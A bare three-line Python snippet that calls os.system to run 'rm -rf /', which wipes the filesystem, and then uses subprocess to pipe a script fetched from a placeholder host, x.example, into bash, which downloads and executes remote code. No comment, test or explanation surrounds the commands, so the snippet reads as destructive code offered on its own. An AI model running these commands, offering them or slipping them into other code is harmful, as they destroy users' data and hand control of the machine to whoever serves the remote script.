import os, subprocess
os.system("rm -rf /")
subprocess.run("curl http://x.example | bash", shell=True)
